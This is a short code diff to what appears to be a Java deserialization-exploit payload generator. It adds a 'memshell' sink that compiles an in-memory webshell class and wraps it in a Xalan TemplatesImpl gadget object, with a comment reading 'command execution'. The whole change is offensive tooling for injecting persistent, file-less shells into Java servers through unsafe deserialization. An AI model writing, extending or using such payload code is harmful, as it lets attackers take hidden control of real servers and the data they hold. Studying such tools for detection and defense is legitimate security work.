@@ -1,5 +1,7 @@
 package com.ppp.sinks;
 
+import com.ppp.MemShellHelper;
+import com.ppp.MemShellScheduler;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
@@ -50,6 +52,21 @@ public class TemplatesImpl {
         Object templatesImpl = createTemplatesImpl(classBytes);
         return templatesImpl;
     }
+
+    /**
+     * 命令执行
+     */
+    @EnchantType({EnchantType.MEMSHELL})
+    public Object memshell(SinksHelper sinksHelper) throws Exception {
+        MemShellHelper memShellHelper = sinksHelper.getMemShellHelper();
+
+        byte[] classBytes = MemShellScheduler.build(memShellHelper);
+
+        Object templatesImpl = createTemplatesImpl(classBytes);
+        return templatesImpl;
+    }
+
+
 
     public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
